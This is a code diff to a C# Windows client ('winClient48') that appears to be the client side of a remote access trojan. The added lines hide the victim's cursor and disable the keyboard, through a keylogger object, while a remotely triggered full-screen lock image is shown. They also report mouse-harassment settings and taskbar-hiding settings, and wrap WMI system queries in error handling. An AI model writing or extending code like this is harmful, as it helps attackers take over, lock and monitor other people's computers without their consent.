@@ -1630,16 +1630,21 @@ namespace winClient48
                                         f_lock = new frmLockScreen();
                                         f_lock.Tag = v;
                                         f_lock.Show();
+
                                         f_lock.Focus();
                                         f_lock.BringToFront();
                                         f_lock.Location = new Point(screen.Bounds.Left, screen.Bounds.Top);
                                         f_lock.WindowState = FormWindowState.Maximized;
                                         f_lock.ShowImage(cmd[3]);
+
                                         l_frmLockScreen.Add(f_lock);
 
                                         WinAPI.SetForegroundWindow(f_lock.Handle);
                                     }
                                 }));
+
+                                Cursor.Hide();
+                                keylogger.disable_keyboard = true;
                             }
                             else
                             {
@@ -1647,6 +1652,9 @@ namespace winClient48
                                 {
                                     f.ShowImage(cmd[3]);
                                 }
+
+                                Cursor.Show();
+                                keylogger.disable_keyboard = false;
                             }
 
                             //Disable keyboard and mouse.
@@ -1714,6 +1722,11 @@ namespace winClient48
                         {
                             string BooleanToString(bool bValue) => bValue ? "True" : "False";
 
+                            bool bMouseVisible = funcFun.bMouseVisible;
+                            bool bMouseCrazy = funcFun.m_bMouseCrazy;
+                            bool bMouseLock = funcFun.m_bMouseLock;
+                            bool bMouseTrail = funcFun.m_bMouseTrail;
+
                             bool bHideTray = funcFun.bHideTray;
                             bool bHideDesktopIcon = funcFun.bHideDesktopIcon;
                             bool bHideClock = funcFun.bHideClock;
@@ -1731,11 +1744,20 @@ namespace winClient48
 
                                 string.Join(",", new string[]
                                 {
+                                    //Mouse
+                                    "MouseVisible:" + BooleanToString(bMouseVisible),
+                                    "MouseCrazy:" + BooleanToString(bMouseCrazy),
+                                    "MouseLock:" + BooleanToString(bMouseLock),
+                                    "MouseTrail:" + BooleanToString(bMouseTrail),
+
+                                    //HWND
                                     "HideTray:" + BooleanToString(bHideTray),
                                     "HideDesktopIcon:" + BooleanToString(bHideDesktopIcon),
                                     "HideClock:" + BooleanToString(bHideClock),
                                     "HideStartOrb:" + BooleanToString(bHideStartOrb),
                                     "HideTaskbar:" + BooleanToString(bHideTray),
+
+                                    //Keyboard
                                     "KeySmile:" + BooleanToString(bKeySmile),
                                     "KeyDisable:" + BooleanToString(bKeyDisable),
                                 }),
@@ -2192,28 +2214,38 @@ namespace winClient48
         private DataTable fnWmiQuery(string szQuery)
         {
             DataTable dt = new DataTable();
-            using (var search = new ManagementObjectSearcher(szQuery))
+            try
             {
-                using (var coll = search.Get())
+                using (var search = new ManagementObjectSearcher(szQuery))
                 {
-                    bool bCollAdded = false;
-                    foreach (ManagementObject obj in coll)
+                    using (var coll = search.Get())
                     {
-                        if (!bCollAdded)
+                        bool bCollAdded = false;
+                        foreach (ManagementObject obj in coll)
                         {
+                            if (!bCollAdded)
+                            {
+                                foreach (PropertyData prop in obj.Properties)
+                                    dt.Columns.Add(prop.Name.ToString());
+
+                                bCollAdded = true;
+                            }
+
+                            DataRow dr = dt.NewRow();
                             foreach (PropertyData prop in obj.Properties)
-                                dt.Columns.Add(prop.Name.ToString());
+                                dr[prop.Name] = prop.Value ?? DBNull.Value;
 
-                            bCollAdded = true;
+                            dt.Rows.Add(dr);
                         }
-
-                        DataRow dr = dt.NewRow();
-                        foreach (PropertyData prop in obj.Properties)
-                            dr[prop.Name] = prop.Value ?? DBNull.Value;
-
-                        dt.Rows.Add(dr);
                     }
                 }
+            }
+            catch (Exception ex)
+            {
+                dt.Columns.Add("Err");
+                DataRow dr = dt.NewRow();
+                dr["Err"] = ex.Message;
+                dt.Rows.Add(dr);
             }
 
             return dt;
